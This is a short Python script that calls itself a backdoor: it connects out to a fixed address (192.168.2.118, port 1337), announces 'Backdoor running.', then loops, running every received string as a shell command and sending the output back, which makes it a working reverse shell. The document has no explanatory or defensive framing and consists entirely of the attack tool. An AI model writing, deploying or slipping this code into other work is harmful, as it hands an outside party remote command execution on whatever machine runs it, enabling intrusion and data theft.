import socket
import subprocess

host = "192.168.2.118"
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send("Backdoor running.")
while True:
    data = s.recv(256)
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = proc.stdout.read()
    stderr = proc.stderr.read()
    s.send(stdout)
    s.send(stderr)
